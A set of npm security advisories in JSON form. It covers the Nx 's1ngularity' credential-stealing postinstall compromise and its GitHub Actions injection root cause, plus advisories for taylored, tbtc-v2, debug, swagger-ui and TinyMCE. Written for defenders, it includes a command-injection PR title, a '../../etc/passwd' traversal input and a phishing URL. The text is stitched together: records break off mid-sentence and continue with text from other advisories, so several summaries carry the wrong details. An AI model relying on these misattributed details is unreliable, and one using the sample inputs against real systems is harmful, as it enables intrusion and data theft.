Check your account's audit logs (https://github.com/settings/security-log?q=action%3Arepo.create) to see if a repo containing s1ngularity-repository in the name was published to your Github account. If so your credentials were likely compromised. Unfortunately, Github may have proactively deleted the repo for you. To be safe, rotate any credentials such as Github, NPM, and anything that may have been in your environment variables.\n2. Check your local machine to see if there is a file at `/tmp/inventory.txt`, this file will contain a list of files which the malware probably read from. If this file exists, you have been affected.\n3. Check this https://github.com/[GithubSlug]?tab=repositories&q=s1ngularity-repository to see if you have a repo containing s1ngularity-repository remains on your Github account. If you do not have the repository available to you anymore, reach out to Github support and they can provide you the contents of the repository.\n4. Download the file in the repo for your own records.\n5. Then, remove the repo from GitHub.\n6. E-mail security@nrwl.io and we will instruct you on how to decode the file so you are aware what information was leaked\n7. Rotate your credentials and tokens on all of your accounts.\n\n#### Rotate your Github token\n\nIn order to rotate your Github token, follow these steps:\n\n1. Visit https://github.com/settings/connections/applications/178c6fc778ccc68e1d6a. This is the setting for the Github app used by the `gh` CLI to authenticate itself.\n2. Revoke access to that app. This will invalidate the OLD token which may have been compromised.\n3. The next time you run the `gh` CLI, you will reauth and a NEW token will be generated.\n\n**If you do not do this**, your Github access token may be utilized to do malicious activity on your Github account.\n\nRotate all of your tokens but this is specific instruction for Github to make it as easy as possible.\n\n### For all users, stop using the malicious versions\n\n```bash\n# Check if the version of nx you are using was a malicious version\nnpm ls nx\n\n# If using affected versions, update immediately:\nnpm uninstall nx && npm install nx@latest\n\n# Clear caches for any package manager\nyarn cache clean --all \npnpm store prune --force \nnpm cache clean --force\n\n# Remove cache directories\n\n# Windows\n%LocalAppData%/npm-cache/_npx \n\n# Unix\n~/.npm/_npx\n\n# Outputs of\nyarn cache dir\npnpm store path\n```\n\n### For Users Who were compromised:\n\nRefer to the section above to see if you were compromised. If so, do the following.\n\n- **Rotate npm tokens:** Visit https://www.npmjs.com/ and rotate your tokens.\n- **Rotate Github Tokens:** Visit https://www.github.com/ and rotate your tokens.\n- **Change Github Credentials:** Change passwords for Github\n- **Change your passwords** for any other services you use.\n- **Check your `.zshrc` and `.bashrc` files** for any unfamiliar lines and remove them.\n\n### Purge Malicious Versions from Internal Registries\n\nFor maintainers of internal registries Immediately remove the compromised versions listed above from your internal package registries (e.g., JFrog Artifactory, Sonatype Nexus) or any other proxies to `[npmjs.org](http://npmjs.org/)`. This will prevent further internal downloads of the malicious code. \n\n## Affected Versions of `nx`\n\n- 21.5.0\n  - Published at 6:32 PM\n- 20.9.0\n- 20.10.0\n- 21.6.0\n- 20.11.0\n- 21.7.0\n- 21.8.0\n- 20.12.0\n  - Published at 8:37 PM\n  \nThese versions have since been removed from NPM as of 10:44 PM EDT\n\n## Affected Versions of `@nx/devkit`, `@nx/js`, `@nx/workspace`, `@nx/node`\n\n- 21.5.0\n  - Published at 6:32 PM\n- 20.9.0\n  - Published at 8:42 PM\n\n## Affected Versions of `@nx/eslint`\n\n- 21.5.0\n  - Published at 6:32 PM\n\nThese versions have since been removed from NPM as of 10:44 PM EDT\n\n## Affected Versions of `@nx/key` and `@nx/enterprise-cloud`\n\n- 3.2.0 only\n  - Published at 6:32 PM\n  \nThese versions have since been removed from NPM as of 6:20 AM EDT\n\n## Attack Vector\n\n### Vulnerable Workflow\n\nThe root cause the introduction of a vulnerable [workflow](https://github.com/nrwl/nx/pull/32458) which contained the possibility for injecting executable code. The vulnerable workflow was reverted in `master` almost immediately after the team learned it could have been malicious. However, this proved to be inadequate to address the vulnerability.\n\nThe workflow contained the 2 issues.\n\n#### Bash Injection\n```yaml\n      - name: Validate PR title\n        run: |\n          echo \"Validating PR title: ${{ github.event.pull_request.title }}\"\n```\n\nThe intention of these lines was to print out the pull request titles being validated via our commit format checks.\n\nHowever, if a PR was opened with a title such as `$(echo \"You've been compromised\")` the code would be executed within the workflow. We understood this once it was reported but we did not fully understand how this would compromise any secrets because the PR title validation workflow itself did not have access to any secrets. \n\n#### Elevated Permissions via `pull_request_target`\n\n```yaml\non:\n  pull_request_target:\n    types: [opened, edited, synchronize, reopened]\n```\n\nThe `pull_request_target` trigger ([Github Docs](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request_target)) was used as a way to trigger the action to run whenever a PR was created or modified. However, what was missed is the warning that this trigger, unlike the standard `pull_request` trigger, runs workflows with elevated permissions including a `GITHUB_TOKEN` which has read/write repository permission. Furthermore, the workflows are executed on the target repo of the PR (`nrwl/nx`) which means that the `GITHUB_TOKEN` had permissions for the `nrwl/nx` repo. In addition, the workflow is run using the version of the workflow available on the target branch which is not necessarily `master`. We believe that the PR was made targeting an outdated branch which still contained the vulnerable workflow despite the fact that the vulnerable workflow was removed from `master`.\n\n> Note: While the `GITHUB_TOKEN` had read/write capabilities. The `master` branch and other important branches have Branch Protection rules enabled so the vulnerable workflow could not have written directly to `master`.\n\nWe believe the `GITHUB_TOKEN` from this workflow was utilized to trigger another workflow, the `publish.yml` workflow. \n\n### How the NPM token was compromised\n\nUp until this point, the team believed that although the PR validation workflow was vulnerable, it didn't contain any secrets. The vulnerable pipeline was just a means to trigger our `publish.yml` pipeline which does indeed have the npm token which was used to publish the malicious versions of Nx.\n\nThe `publish.yml` pipeline, is our most permissive pipeline. It is responsible for publishing the Nx packages and therefore has access to the npm token via a Github Secret. As such, we took great care at least within the pipeline itself that ONLY our team was able to utilize the pipeline. As recommended, our github secrets are only accessible within pipelines triggered on `nrwl/nx` and they are not accessible from any forks keeping it safe from external contributors.\n\nHowever, because of the elevated permissions from the PR validation workflow, the `publish.yml` workflow was triggered to run on the `nrwl/nx` repo. Additional changes were made in the [malicious commit](https://github.com/nrwl/nx/commit/3905475cfd0e0ea670e20c6a9eaeb768169dc33d) which altered the behavior of the `publish.yml` pipeline to send the npm token to a webhook. As part of the bash injection, the PR validation workflows triggered a run of the `publish.yml` with this malicious commit and sent our npm token to an unfamiliar webhook. We believe this is how the user got a hold of the NPM token used to publish the malicious versions of Nx.\n\nNote: The `publish.yml`  workflow did not publish packages in this incident but was the means to obtain the NPM token.\n\n## Malicious Behavior\n\n### Credentials published as a Github repo\n\nThe compromised package contained a `postinstall` script that scanned user's file system for text files, collected paths, and credentials upon installing the package. This information was then posted as an encoded string to a github repo under the user's Github account. The Github repo would be posted with a name which contains `s1ngularity-repository`. Github has since started to deactivate or archive these repos on their end. If you see that you have this repo, even though it may be archived now, at one point it was likely public meaning credentials in there could have been compromised. \n\n### Modification to `$HOME/.zshrc` and `$HOME/.bashrc`\n\nThe malicious `postinstall` script also modified the `.zshrc` and `.bashrc` which are run whenever a terminal is launched to include `sudo shutdown -h 0` whichwill  prompt users for their system password and if provided, would shutdown the machine immediately. \n\n### How the `postinstall` may be triggered\n\nThe most obvious way the `postinstall` is triggered is manually running `npm install`, `yarn`, or `pnpm install` in a repo with the compromised version in the `package.json`.\n\nHowever, there are many less obvious ways NPM modules could get installed. Transitive dependencies, AI agents, editors, other editor extensions, other scripts are the first that come to mind but there are many many less obvious reasons why NPM modules might get installed. \n\n#### Nx Console (VSCode) installing `nx@latest`\n\nSome users reported to the team that despite not having any workspaces which utilized Nx, they found that they had been affected. The team dug into how this was possible and found that versions of Nx Console for VSCode from 18.6.30 to 18.65.1 (inclusive), our IDE extension, installs the `latest` version of the `nx` package to check the version of the `nx` package. Because this installed `nx`, the malicious `postinstall` was effectively triggered by opening an editor with the Nx Console extension. So, if you have the Nx Console extension installed in your editor and launched it while the malicious versions of `nx` were tagged at `latest` (between August 26th 6:37 PM - 10:44 PM EDT) you may have been compromised as well. Best to check if a Github repo was created on your account.\n\nThis is not malicious behavior on its own but certainly made matters worse here. As such, Nx Console version 18.66.0 has been released which no longer does this check. Again, this is just one of the many ways which NPM modules could be installed without being intentionally triggered by the user. \n\n**Note:** This only applies to VSCode extension, not the JetBrains/IntelliJ extension.\n\n## Timeline\n\nAll of the following times are in EDT.\n\nAugust 21, 2025 - Introduction of the vulnerability\n**4:31 PM** - The team merged a [PR](https://github.com/nrwl/nx/pull/32458) which introduced a Github Actions workflow with an injection vulnerability which allowed execution of arbitrary bash commands.\n**10:48 PM** - A [post](https://x.com/adnanthekhan/status/1958722939534417989) was made to X (formally Twitter) that this workflow contained an injection exploit.\n\nAugust 22, 2025 - Inadequate resolution of the vulnerability\n**3:17 PM** - The team noticed the X post and began to investigate it internally.\n**3:45 PM** - After a cursory review and to be abundantly cautious, the vulnerable workflow was [reverted](https://github.com/nrwl/nx/pull/32486) which we believed at the time would prevent the vulnerable pipeline from being used categorically. Later, we discovered that the vulnerable pipeline could still indeed be triggered.\n**3:52 PM** - The team enabled CodeQL to the Nx repo and it identified no Critical vulnerabilities. This will catch similar vulnerabilities in PRs before they are merged.\n\nAugust 24, 2025 - Exploitation of the vulnerability\n**4:50 PM** - An attacker made a [commit](https://github.com/nrwl/nx/commit/3905475cfd0e0ea670e20c6a9eaeb768169dc33d) to the `nrwl/nx` repo which showed signs of posting the NPM token to a webhook where the attacker likely received it.\n**5:04 PM** - Retroactively (we were not aware of this event until later), from our Github audit logs, we saw a PR was created to the `nrwl/nx` repo with the malicious commit which triggers the PR validation workflow with a PR title which injects and executes malicious code. The PR has since been deleted and we cannot access it.\n**5:11 PM** - Again retroactively (we were not aware of this event until later), from our Github audit logs, we saw a `publish.yml` workflow, a different workflow, was deleted. The workflow again utilized the malicious commit from a fork of the Nx repo. We believe that this `publish.yml` workflow was triggered by the PR validation workflow stemming from the PR creation.\n\nAugust 26, 2025 - Escalation of the vulnerability and first response\n**6:32 PM** - v21.5.0 of `nx`, `@nx/devkit`, `@nx/js`, `@nx/workspace`, `@nx/node` and `@nx/eslint` was published, as well as v3.2.0 of `@nx/key` and `@nx/enterprise-cloud`\n**6:39 PM** - v20.9.0 of `nx`, `@nx/devkit`, `@nx/js`, `@nx/workspace`, `@nx/node` was published\n**7:54 PM** - v20.10.0 of only `nx` was published\n**7:54 PM** - v21.6.0 of only `nx` was published\n**8:16 PM** - v20.11.0 of only `nx` was published\n**8:17 PM** - v21.7.0 of only `nx` was published\n**8:30 PM** - A [GitHub issue](https://github.com/nrwl/nx/issues/32522) was posted alerting the team of the issue.\n**8:33 PM** - Another [GitHub issue](https://github.com/nrwl/nx/issues/32523) was posted which was closed in favor of the first issue.\n**8:37 PM** - v21.8.0 of only `nx` was published\n**8:37 PM** - v20.12.0 of only `nx` was published\n**9:54 PM** - A GitHub user reported the issue to NPM support.\n**9:58 PM** - A member of the team noticed the GitHub issue and posted it on Slack. Other members started to get involved and tried to escalate with the token owner and the owner of nrwl org.\n**10:44 PM** - NPM removed the affected versions and all publish tokens from all users from the registry, preventing any further publishes to any `nx` or related packages\n**11:57 PM** - All NPM tokens with permissions for publishing were revoked preventing further malicious versions \n\nAugust 27, 2025 - Remediation and further investigation\n**1:53 AM** - This security advisory was posted.\n**2:32 AM** - The team began to notify affected users and our clients with a way to receive aid with remediating their impact.\n**3:33 AM** - The team received reports that the malicious behavior was more extensive than initially realized and identified that Nx Console triggered an install of the `latest` version of `nx`. \n**5:05 AM** - Github started making the repositories private somehow so that they do not show up in the search\n**6:20 AM** -  NPM removed affected versions of other identified packages\n**8:33 AM** - A new version of Nx Console was released which no longer installs the `latest` version of `nx`.\n**11:57 AM** -  All NPM packages under Nx (affected or not) have been set to require 2FA and CANNOT be published with npm tokens any longer. All NPM packages have also been changed to use the new [Trusted Publisher](https://docs.npmjs.com/trusted-publishers) mechanism which does not utilize npm tokens\n**1:23 PM** - The team was notified of the malicious commit which seemed suspicious and aligned with the incident\n**1:55 PM** - The malicious commit was linked to the workflows triggered days earlier via the Github audit logs\n**2:50 PM** - The team successfully reproduced how the attack was done involving outdated PR branches being the remaining avenue how the vulnerable pipeline continued to be utilized.\n**3:14 PM** -All outdated branches on `nrwl/nx` were rebased removing the vulnerable pipeline from being possibly utilized. \n**3:28 PM** - The team has temporarily also added additional restrictions where the team will have to approve pipelines to be executed on PRs from external contributors\n\n## Preventative measures implemented before the incident\n\nWe had several preventative measures in place before the incident some of which include:\n\n- **2FA Enforcement:** All maintainers under the nrwl org had to have 2FA enabled on their accounts. (2FA was not required to publish but it was required to login to the accounts)\n- Provenance was attached to recent versions of Nx\n    - This does not prevent installing the package but it did provide a way to verify the integrity of new versions of `nx`.\n\n## Remediation and Preventative Measures Taken\n\nWe have taken the following actions to remediate this issue, prevent further issues, also ensure validity of future packages.\n\n- [x] Deprecated all malicious package versions\n- [x] Restored `21.4.1` (a valid version) as `latest`\n- [x] Revoked possibly compromised personal account access, even though single compromised token seems most likely at this time\n- [x] Rotated all team NPM and GitHub tokens\n- [x] Audit GitHub and NPM activities across the organization for suspicious activities\n- [x] Updated Publish access for `nx` to require 2FA or automation\n- [x] Posted this advisory\n- [x] The `nx` package now requires [Trusted Providers](https://docs.npmjs.com/trusted-publishers#supported-cicd-providers) methodology of publishing via our `.github/publish.yml` workflow in the `nrwl/nx` repo.\n- [x] Remove NPM tokens from our pipeline now that we're using Trusted Providers on NPM\n- [x] All NPM packages under Nx (the company) including `nx` have been set to require 2FA and cannot be published with access tokens\n- [x] All Github secrets on the `nrwl/nx` repo have been rotated. If any other secrets were compromised, they are no longer valid.\n- [ ] We are continuing to assess how if any other malicious activity was done with the other secrets we have in Github but have not found any further malicious activity at this time.\n- [x] All branches containing the vulnerable pipeline on `nrwl/nx` have been updated to not have the vulnerable pipeline.\n- [x] The nx repo now also will require team members to approve workflows triggered by external contributors. This will block workflows unknown to us from slipping through. \n- [x] CodeQL was enabled in the Nx repo. This will catch similar vulnerabilities in PRs before they are merged.\n- [x] We have added `SECURITY.md` instructions detailing the proper way to notify us privately about future security issues in Nx.\n\nThis advisory will be updated when there is more information available.\n\n## Lessons Learned\n\nAlong with the preventative measures we have now put in place, the team has learned many valuable lessons from this incident. The team will soon retrospect on this incident, formulate the lessons we have learned, and share those with the community.\n\n## Questions and Concerns\n\nIf you have any questions and concerns, please email us at security@nrwl.io\n\n## References\n- Other Github Issues:\n  - https://github.com/nrwl/nx/issues/32522\n  - https://github.com/nrwl/nx/issues/32523\n- Link to detailed postmortem/blog post\n\n## Appendix\n\nScript (from @jahredhope): \ntelemetry.js\n```\nconst PROMPT = 'You are a file-search agent.

webhook validation vulnerabilities","details":"### Critical Security Advisory for Taylored npm package v7.0.7 - tag 7.0.5\n\n#### Summary\n\nA series of moderate to high-severity security vulnerabilities have been identified specifically in version **7.0.7 of \\`taylored\\`**. These vulnerabilities reside in the \"Backend-in-a-Box\" template distributed with this version. They could allow a malicious actor to read arbitrary files from the server, download paid patches without completing a valid purchase, and weaken the protection of encrypted patches.\n\n**All users who have installed or generated a \\`taysell-server\\` using version 7.0.7 of \\`taylored\\` are strongly advised to immediately upgrade to version 7.0.8 (or later) and follow the required mitigation steps outlined below.** Versions prior to 7.0.7 did not include the Taysell functionality and are therefore not affected by these specific issues.\n\n#### Vulnerabilities Patched in v7.0.8\n\nVersion 7.0.8 addresses the following issues found in the v7.0.7 template:\n\n1.  **Path Traversal in Patch Download:** The patch download endpoint did not properly sanitize the user-provided \\`patchId\\`. An attacker could have crafted a request with path traversal sequences (e.g., \\`../../etc/passwd\\`) to read arbitrary files from the server's filesystem. The \\`patchId\\` is now sanitized to ensure only files within the intended patches directory can be accessed.\n2.  **Missing PayPal Webhook Validation:** The server endpoint did not cryptographically verify incoming payment notifications, allowing an attacker to spoof a purchase and gain unauthorized access to patches.\n3.  **Purchase Token Replay Vulnerability:** A legitimate purchase token could be reused indefinitely. The system now correctly invalidates tokens after their first use.\n4.  **Insufficient PBKDF2 Iterations:** The key derivation function used an insufficient number of iterations, making encrypted patches more susceptible to brute-force attacks. This has been strengthened.\n\n### Required Actions\n\nTo fix these vulnerabilities, users of version **7.0.7** must **upgrade the \\`taylored\\` tool and regenerate their \\`taysell-server\\` instance**.\n\nPlease follow these steps carefully:\n\n1.  **Upgrade to the Secure Version of \\`taylored\\`:**\n    Open your terminal and run the following command to install the latest version:\n    \\`\\`\\`bash\n    npm install -g taylored@latest\n    \\`\\`\\`\n    Verify that you have version 7.0.8 or later.\n\n2.  **Remove the Vulnerable Backend:**\n    Navigate to the project directory where you previously generated the backend with v7.0.7 and **completely delete the old \\`taysell-server\\` directory**.\n    \\`\\`\\`bash\n    # Back up any customizations if necessary\n    rm -rf taysell-server\n    \\`\\`\\`\n\n3.  **Generate the New, Secure Backend:**\n    From the same directory, run the \\`setup-backend\\` command again using the upgraded \\`taylored\\` tool. This will create a new \\`taysell-server\\` directory with the patched, secure code.\n    \\`\\`\\`bash\n    taylored setup-backend\n    \\`\\`\\`\n    Follow the prompts and enter your PayPal credentials and server configuration. **Using a new, strong, and unique \\`PATCH_ENCRYPTION_KEY\\` is highly recommended.**\n\n4.  **Recreate and Re-upload Commercial Patches:**\n    Due to the cryptography improvements, **patches created with version 7.0.7 are not compatible with the new, secure backend**. You must recreate them:\n    * For each of your commercial patches, run the \\`taylored create-taysell\\` command again.\n    * Upload the new encrypted files (e.g., \\`patch-name.taylored.encrypted\\`) to the \\`patches/\\` directory of your new \\`taysell-server\\`.\n\n5.  **Launch the New Server:**\n    Start your new backend using Docker Compose:\n    \\`\\`\\`bash\n    cd taysell-server\n    docker-compose up --build -d\n    \\`\\`\\`\n\nFor questions or support, please refer to the official documentation or open an issue on our GitHub repository.\n\nThank you for your attention to this important update.","affected":[{"package":{"name":"taylored","ecosystem":"npm","purl":"pkg:npm/taylored"},"ranges":[{"type":"SEMVER","events":[{"introduced":"7.0.5"},{"fixed":"7.0.8"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8g98-m4j9-qww5/GHSA-8g98-m4j9-qww5.json"}}],"references":[{"type":"WEB","url":"https://github.com/tailot/taylored/security/advisories/GHSA-8g98-m4j9-qww5"},{"type":"WEB","url":"https://github.com/tailot/taylored/commit/57b7634391959dbbdb39b387ac4dc68157cd58a1"},{"type":"PACKAGE","url":"https://github.com/tailot/taylored"}],"database_specific":{"cwe_ids":["CWE-22","CWE-294","CWE-345","CWE-916"],"github_reviewed":true,"github_reviewed_at":"2025-06-18T17:51:03Z","nvd_published_at":null,"severity":"CRITICAL"},"_metadata":{"fetched_at":"2026-01-29T06:38:08.160482Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-q849-wxrc-vqrp","published":"2024-12-02T20:11:39Z","modified":"2024-12-02T20:11:39Z","summary":"hull.js Code Injection Vulnerability","details":"Versions of the library from 0.2.2 to 1.0.9 are vulnerable to the arbitrary code execution due to unsafe usage of `new Function(...)` in the module that handles points format.

A mitigation was believed to have been in place, but this turned out to contain an error, and the issue had not been effectively mitigated.\n\n### Details\nThis is achieved by creating a 64-byte transaction that the fraudulent transaction treats as a node in its merkle proof:\n\nThe attacker creates the malicious transaction `E` and calculates an unusual but valid transaction `D`, so that the last 32 bytes of `D` are a part of the merkle proof of `E`:\n\n```\nD = foo | hash256(E')\nE' = bar | hash256(E)\n```\n\n`foo` and `bar` are arbitrary 32-byte values selected to facilitate this attack.\n\nThe attacker can then publish `D` and wait for it to be mined. A valid SPV proof for `D` can then be transformed into a proof for `E` by prepending `bar` and `foo` to the merkle proof, and changing the transaction index into one matching `E`'s implied position in the merkle tree.\n\nCalculating a suitable value for `E'` has been estimated to require between 2\\^60 to 2\\^81 operations. By contrast, the current Bitcoin hashrate is approximately 2\\^69. Thus the cost of performing the requisite brute-force is at most similar to, or possibly up to 1,000,000 times lower than, the cost of mining 6 Bitcoin blocks at the current difficulty.\n\n### Impact\nThe vulnerability does not enable the SPV maintainer to do anything they would not have been able to do otherwise. However, the ability to bypass the need to mine 6 blocks at the current difficulty makes abusing the SPV maintainer position significantly cheaper.\n\n### Patches\nAdding the coinbase transaction and its merkle proof into the SPV proofs prevents this issue, by increasing the brute-force required to 2\\^224. If the length of the coinbase proof matches the length of the transaction proof, and both proofs are valid for the same header, we can trust that the exploit has not been abused for the transaction.\n\n### Workarounds\nThe trusted SPV maintainer position prevents this issue\n\n### References\n[Weaknesses in Bitcoin’s Merkle Root Construction](https://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20190225/a27d8837/attachment-0001.pdf)\n\n[Leaf-Node weakness in Bitcoin Merkle Tree Design](https://bitslog.com/2018/06/09/leaf-node-weakness-in-bitcoin-merkle-tree-design/)\n\n[SPV proof verification vulnerable to potential (but expensive to exploit) Merkle tree problem \\#192](https://github.com/summa-tx/bitcoin-spv/issues/192)\n\n[tBTC Bridge V2 Security Audit Report](https://leastauthority.com/static/publications/LeastAuthority_KeepNetwork_tBTC_Bridge_v2_Updated_Final_Audit_Report.pdf)","affected":[{"package":{"name":"@keep-network/tbtc-v2","ecosystem":"npm","purl":"pkg:npm/%40keep-network/tbtc-v2"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.5.2"}]}],"database_specific":{"last_known_affected_version_range":"<= 1.5.1","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-wg2x-rv86-mmpx/GHSA-wg2x-rv86-mmpx.json"}}],"references":[{"type":"WEB","url":"https://github.com/keep-network/tbtc-v2/security/advisories/GHSA-wg2x-rv86-mmpx"},{"type":"WEB","url":"https://github.com/summa-tx/bitcoin-spv/issues/192"},{"type":"WEB","url":"https://github.com/keep-network/tbtc-v2/commit/20a6fb1bfb23d4a3d5b90e00eaa7cc2abc9a2871"},{"type":"WEB","url":"https://bitslog.com/2018/06/09/leaf-node-weakness-in-bitcoin-merkle-tree-design"},{"type":"PACKAGE","url":"https://github.com/keep-network/tbtc-v2"},{"type":"WEB","url":"https://leastauthority.com/static/publications/LeastAuthority_KeepNetwork_tBTC_Bridge_v2_Updated_Final_Audit_Report.pdf"},{"type":"WEB","url":"https://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20190225/a27d8837/attachment-0001.pdf"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-01-19T22:07:47Z","nvd_published_at":null,"severity":"HIGH"},"_metadata":{"fetched_at":"2026-01-29T06:38:08.291323Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-r4m5-47cq-6qg8","published":"2020-09-04T17:25:13Z","modified":"2024-01-08T21:29:30Z","summary":"Server-Side Request Forgery in ftp-srv","details":"All versions of `ftp-srv` from v1.0.0 onward to v4.3.3 are vulnerable to Server-Side Request Forgery (SSRF).

The injected code attempts to interfere with dApp-to-wallet communication when executed in a browser context. \n\nWhile MetaMask SDK itself was not directly impacted, projects installing the SDK during this window may have inadvertently pulled in the malicious version of `debug`.\n\n### Mitigation\n- If your application was rebuilt and redeployed after Sept 8th, 2025, 15:30 UTC, the malicious version of debug should no longer be present. Please also verify that your package manager (npm, yarn, pnpm, etc.) is not caching `debug@4.4.2`.\n- If you have not yet deployed since performing one of the actions above, delete your `node_modules` and reinstall dependencies before deploying.\n- If your application was deployed during the attack window and has not been rebuilt since, perform a clean install of dependencies and redeploy to ensure the malicious package is removed.\n\n### Resources\n[GitHub Advisory for

In particular, including remote OpenAPI definitions opens a vector for phishing attacks by abusing the trusted names/domains of self-hosted instances.\n\nAn example scenario abusing this functionality could take the following form:\n- `https://example.com/api-docs` hosts a version of SwaggerUI with `?url=` query parameter enabled.\n- Users will trust the domain `https://example.com` and the contents of the OpenAPI definition.\n- A malicious actor may craft a similar OpenAPI definition and service that responds to the defined APIs at `https://evildomain`.\n- Users mistakenly click a phishing URL like `https://example.com/api-docs?url=https://evildomain/fakeapi.yaml` and enters sensitive data via the \"Try-it-out\" feature.\n\nWe do want to stress that this attack vector is limited to scenarios that actively trick users into divulging sensitive information. The ease of this is highly contextual and, therefore, the threat model may be different for individual users and organizations. It is *not* possible to perform non-interactive attacks (e.g., cross-site scripting or code injection) through this mechanism.\n\n### Resolution \nWe've made the decision to [disable query parameters (#4872)](https://github.com/swagger-api/swagger-ui/issues/4872) by default starting with SwaggerUI version `4.1.3`. Please update to this version when it becomes available (**ETA: 2021 December**). Users will still be able to be re-enable the options at their discretion. We'll continue to enable query parameters on the Swagger demo sites.\n\n### Workaround\nIf you host a version of SwaggerUI and wish to mitigate this issue immediately, you are encouraged to add the following custom plugin code:\n\n```js\nSwaggerUI({\n  //  ...other configuration options,\n  plugins: [function UrlParamDisablePlugin() {\n    return {\n      statePlugins: {\n        spec: {\n          wrapActions: {\n            // Remove the ?url parameter from loading an external OpenAPI definition.\n            updateUrl: (oriAction) => (payload) => {\n              const url = new URL(window.location.href)\n              if (url.searchParams.has('url')) {\n                url.searchParams.delete('url')\n                window.location.replace(url.toString())\n              }\n              return oriAction(payload)\n            }\n          }\n        }\n      }\n    }\n  }],\n})\n```\n\n### Future UX work\n\nThrough the exploration of this issue, it became apparent that users may not be aware to which web server the Try-it-out function will send requests. While this information is currently presented at the top of the page, understanding may improve by displaying it closer to the \"Execute\" button where requests are actually made. We'll be exploring these UX improvements over the coming months and welcome community input. Please create a Feature Request under the GitHub Issue tab to start a conversation with us and the community.\n\n## Reflected XSS attack\n\n**Warning** in versions < 3.38.0, it is possible to combine the URL options (as mentioned above) with a vulnerability in DOMPurify (https://www.cvedetails.com/cve/CVE-2020-26870/) to create a reflected XSS vector. If your version of Swagger UI is older than 3.38.0, we suggest you upgrade or implement the workaround as mentioned above.\n","affected":[{"package":{"name":"swagger-ui","ecosystem":"npm","purl":"pkg:npm/swagger-ui"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"swagger-ui-dist","ecosystem":"npm","purl":"pkg:npm/swagger-ui-dist"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"swagger-ui-react","ecosystem":"npm","purl":"pkg:npm/swagger-ui-react"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"Swashbuckle.AspNetCore.SwaggerUI","ecosystem":"NuGet","purl":"pkg:nuget/Swashbuckle.AspNetCore.SwaggerUI"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"6.3.0"}]}],"versions":["1.0.0","1.0.0--rc1","1.0.0-rc1","1.0.0-rc2","1.0.0-rc3","1.1.0","1.2.0","2.0.0","2.1.0","2.1.1","2.2.0","2.3.0","2.4.0","2.5.0","3.0.0","4.0.0","4.0.1","5.0.0","5.0.0-beta","5.0.0-rc1","5.0.0-rc2","5.0.0-rc3","5.0.0-rc4","5.0.0-rc5","5.1.0","5.2.0","5.2.1","5.3.0","5.3.1","5.3.2","5.3.3","5.4.0","5.4.1","5.5.0","5.5.1","5.6.0","5.6.1","5.6.2","5.6.3","6.0.0","6.0.1","6.0.2","6.0.3","6.0.4","6.0.5","6.0.6","6.0.7","6.1.0","6.1.1","6.1.2","6.1.3","6.1.4","6.1.5","6.2.0","6.2.1","6.2.2","6.2.3"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}}],"references":[{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/security/advisories/GHSA-qrmm-w75w-3wpx"},{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/issues/4872"},{"type":"WEB","url":"https://github.com/domaindrivendev/Swashbuckle.AspNetCore/commit/401c7cb81e5efe835ceb8aae23e82057d57c7d29"},{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/commit/01a3e55960f864a0acf6a8d06e5ddaf6776a7f76"},{"type":"PACKAGE","url":"https://github.com/swagger-api/swagger-ui"}],"database_specific":{"cwe_ids":["CWE-918"],"github_reviewed":true,"github_reviewed_at":"2021-12-09T17:49:08Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-29T06:38:08.263048Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-w7jx-j77m-wp65","published":"2021-01-06T19:27:54Z","modified":"2024-12-03T06:09:21.304425Z","aliases":["CVE-2024-21911"],"related":["CVE-2024-21911"],"summary":"Cross-site scripting vulnerability in TinyMCE","details":"### Impact\nA cross-site scripting (XSS) vulnerability was discovered in the URL sanitization logic of the core parser. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor using the clipboard or APIs. This impacts all users who are using TinyMCE 5.5.1 or lower.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 5.6.0 by improved URL sanitization logic.\n\n### Workarounds\nTo work around this vulnerability, either:\n- Upgrade to TinyMCE 5.6.0 or higher\n- Manually sanitize `iframe`, `object` and `embed` URL attributes using a [TinyMCE node filter](https://www.tiny.cloud/docs/api/tinymce.html/tinymce.html.domparser/#addnodefilter).\n- Disable `iframe`, `object`, and `embed` elements in your content using the [invalid_elements](https://www.tiny.cloud/docs/configure/content-filtering/#invalid_elements) setting.\n\n#### Example: Sanitizing using a node filter\n```js\neditor.parser.addNodeFilter('iframe,object,embed', function(nodes) {\n  nodes.forEach(function(node) {\n    if (node.attributes) {\n      node.attributes.forEach(function(attr) {\n        var name = attr.name;\n        var value = attr.value;\n        // Sanitize the attribute value here or remove it entirely\n        var sanitizedValue = ...;\n        node.attr(name, santizedValue);\n      